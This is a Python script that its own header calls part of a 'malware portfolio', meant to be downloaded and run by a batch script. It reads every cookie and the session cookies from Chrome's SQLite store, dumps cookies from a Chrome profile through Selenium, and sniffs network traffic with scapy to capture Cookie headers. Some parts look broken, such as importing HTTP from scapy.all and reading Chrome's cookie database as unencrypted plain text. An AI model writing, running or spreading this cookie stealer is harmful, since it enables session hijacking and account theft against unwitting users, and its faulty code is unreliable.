'''

python script for my malware portfolio, a batch script runs and downloads this python script and runs it. This program retreives cookies from chrome, session cookies and
caprures network traffic by sniffing with scapy

'''


import sqlite3
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from scapy.all import sniff, TCP, HTTP

# Function to retrieve cookies from Chrome's SQLite database
def retrieve_cookies_from_chrome():
    # Path to Chrome's cookies file
    cookies_file = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")

    # Connect to the SQLite database
    con = sqlite3.connect(cookies_file)
    cur = con.cursor()

    # Query the cookies table to get all cookies
    cur.execute("SELECT * FROM cookies")
    rows = cur.fetchall()
    print("Cookies from Chrome's SQLite database:")
    for row in rows:
        print(row)

    # Query the cookies table to get session cookies
    cur.execute("SELECT * FROM cookies WHERE is_secure = 1 AND is_httponly = 1 AND expires = 0")
    session_rows = cur.fetchall()
    print("\nSession Cookies from Chrome's SQLite database:")
    for row in session_rows:
        print(row)

    # Close the connection
    con.close()

# Function to retrieve cookies using Selenium
def retrieve_cookies_using_selenium():
    # Set up the Chrome driver
    options = webdriver.ChromeOptions()
    options.add_argument("user-data-dir=C:\\Path\\To\\Chrome\\Profile")
    driver = webdriver.Chrome(options=options)

    # Navigate to the website
    driver.get("https://example.com")

    # Wait for the page to load and cookies to be set
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

    # Get the cookies
    cookies = driver.get_cookies()
    print("\nCookies retrieved using Selenium:")
    for cookie in cookies:
        print(cookie)

    # Close the driver
    driver.quit()

# Function to capture network traffic and extract cookies using Scapy
def capture_network_traffic():
    def extract_cookies(packet):
        if packet.haslayer(TCP) and packet.haslayer(HTTP):
            http_layer = packet[HTTP]
            if http_layer.fields.get('Cookie'):
                print("Captured Cookie:", http_layer.fields.get('Cookie'))

    print("\nCapturing network traffic to extract cookies...")
    sniff(prn=extract_cookies, store=False)

# Main function to execute all tasks
def main():
    retrieve_cookies_from_chrome()
    retrieve_cookies_using_selenium()
    capture_network_traffic()

if __name__ == "__main__":
    main()
